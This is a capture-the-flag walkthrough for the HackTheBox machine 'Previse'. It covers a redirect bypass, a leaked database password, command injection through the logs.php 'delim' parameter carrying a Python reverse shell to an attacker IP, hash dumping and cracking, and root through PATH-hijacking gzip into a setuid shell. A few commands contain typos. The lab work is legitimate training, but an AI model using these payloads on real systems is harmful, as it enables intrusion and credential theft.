# Previse HackTheBox
![Pasted image 20210808114616](https://user-images.githubusercontent.com/5285547/128632748-0d83d51b-80c5-4183-8528-6d22eca06a25.png)


 Link: https://www.hackthebox.eu/home/machines/profile/373
 
 ## Enum
 
 Nmap 
 
 ```sh
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
 ```
 
 Ffuf
 
 ```
index.php               [Status: 302, Size: 2801, Words: 737, Lines: 72]
login.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
download.php            [Status: 302, Size: 0, Words: 1, Lines: 1]
footer.php              [Status: 200, Size: 217, Words: 10, Lines: 6]
header.php              [Status: 200, Size: 980, Words: 183, Lines: 21]
favicon.ico             [Status: 200, Size: 15406, Words: 15, Lines: 10]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
.                       [Status: 302, Size: 2801, Words: 737, Lines: 72]
status.php              [Status: 302, Size: 2966, Words: 749, Lines: 75]
nav.php                 [Status: 200, Size: 1248, Words: 462, Lines: 32]
accounts.php            [Status: 302, Size: 3994, Words: 1096, Lines: 94]
files.php               [Status: 302, Size: 4914, Words: 1531, Lines: 113]
 ```
 
Curl

```
curl http://10.129.156.76/files.php
```
 
![Pasted image 20210808115843](https://user-images.githubusercontent.com/5285547/128632797-ed5818f5-951e-43e3-bb43-58e0a6b8ca89.png)

 
So it seems we can access parts of the site with a fwe tricks. Testing further showed I can capture the request from nav.php and then change the response from a 302 to 200 to access the account page. 

Clicking on Do Intercept > Response to this request. 

![Pasted image 20210808120901](https://user-images.githubusercontent.com/5285547/128632802-e071cb54-d5b7-4841-bf0b-eaee33fff54f.png)

Change the 302 to 200

![Pasted image 20210808120931](https://user-images.githubusercontent.com/5285547/128632807-4ef85fe3-ab62-41dd-82f8-3f6d97b12a4d.png)

Create a new user and use the same tatics for capturing the request and editing the response. 

![Pasted image 20210808121122](https://user-images.githubusercontent.com/5285547/128632809-9c070d26-6f1f-4b30-8439-e95d17449f9c.png)

Then login with the new account. 

![Pasted image 20210808121244](https://user-images.githubusercontent.com/5285547/128632811-6dfb5364-f548-4c8a-b0cb-852664cd5fdd.png)

Files. 

config.php

```
$host = 'localhost';
$user = 'root';
$passwd = 'mySQL_p@ssw0rd!:)';
$db = 'previse';
```

logs.phg

![Pasted image 20210808122858](https://user-images.githubusercontent.com/5285547/128632824-737e312c-6a55-4b6c-bb12-5157c38f3119.png)

In logs.php we can ssee the developer had to use python instead of PHP for the delimiters for ease of use and this also looks vunerable to command injection. 

## User

Reverse shell.

To get a reverse shell. Login as your new user, goto the Management menu > logs. 

Capture the request in burp and add a python reverse shell to the delim attribute. 

```
delim=comma;python3+-c+'import+os,pty,socket%3bs%3dsocket.socket()%3bs.connect(("10.10.14.250",9999))%3b[os.dup2(s.fileno(),f)for+f+in(0,1,2)]%3bpty.spawn("/bin/bash")'
```

![Pasted image 20210808122549](https://user-images.githubusercontent.com/5285547/128632831-3944e2f8-bce1-42e7-9d06-24828f3194cc.png)

Have your netcat listner ready! 

```sh
rlwrap -cAr nc -lnvp 9999
```

### mysql

Let's get any info and hash's from the database. 

```sql
mysql -u root -p
pass:mySQL_p@ssw0rd!:)

show databases;
use previse;
show tables;

select * from accounts;
```

![Pasted image 20210808132042](https://user-images.githubusercontent.com/5285547/128632834-98e360e5-bda9-49a9-8580-ab847e84ece8.png)

Cracking the hash

hashcat

```bash
hashcat -a 0 -m 500 hash.txt /usr/share/wordlists/rockyou.txt -O
```

john

```bash
john -format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```sh
m4lwhere:<REDACTED>
```

Time to SSH into the box for a better shell. 

```sh
ssh m4lwhere@IP
```

## Root

![Pasted image 20210808134325](https://user-images.githubusercontent.com/5285547/128632874-a05a0c64-f288-4bb6-81cc-8646d3edfbcb.png)

Let's try some path abuse for gzip.

```sh
cd /tmp
cat << EOF > gzip
> #!/bin/bash
> cp /bin/bash /tmp/c             
> chmod u+s /tmp/c
> EOF
chmod +x gzip
export PATH=/tmp:PATH
```

```sh
sudo /opt/scripts/access_backup.sh
/tmp./c -p
```

![Pasted image 20210808135613](https://user-images.githubusercontent.com/5285547/128632869-a510ef67-f3c9-45cd-a21e-add95c04b502.png)
